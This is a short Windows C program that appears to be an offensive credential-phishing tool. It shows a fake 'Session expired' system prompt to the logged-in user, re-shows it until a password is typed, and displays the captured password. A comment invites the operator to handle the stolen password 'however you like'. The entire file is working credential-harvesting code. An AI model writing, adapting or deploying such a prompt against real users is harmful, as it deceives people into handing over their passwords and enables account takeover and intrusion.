#include <Windows.h>
#include <wincred.h>

// link against CredUI.lib
#pragma comment(lib, "credui")

BOOL AskNicely(TCHAR * strPasswd) {
	// buffers for user and password
	TCHAR strUser[CREDUI_MAX_USERNAME_LENGTH + 1] = { 0 };

	// get username of target user
	DWORD dwBuffer = sizeof(strUser);
	if (!GetUserNameW(strUser, &dwBuffer))
		return FALSE;

	// set prompt information
	CREDUI_INFOW uiInfo = { sizeof(CREDUI_INFO), NULL, L"Session expired.", L"Required authentication", NULL };

	// keep spawning the prompt as long as no password has been inputted
	DWORD error = -1;
	while (error != NO_ERROR || strPasswd[0] == '\0')
		error = CredUIPromptForCredentialsW(&uiInfo, L"LOCAL", NULL, NULL, strUser, 
			CREDUI_MAX_USERNAME_LENGTH, strPasswd, CREDUI_MAX_PASSWORD_LENGTH, NULL, 
			CREDUI_FLAGS_INCORRECT_PASSWORD | CREDUI_FLAGS_KEEP_USERNAME);

	return TRUE;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	TCHAR strPasswd[CREDUI_MAX_PASSWORD_LENGTH + 1] = { 0 };

	if (AskNicely(strPasswd))
		// obviously don't simply display the password, treat it however you like
		MessageBox(NULL, strPasswd, L"Password captured", MB_OK);

	return 0;
}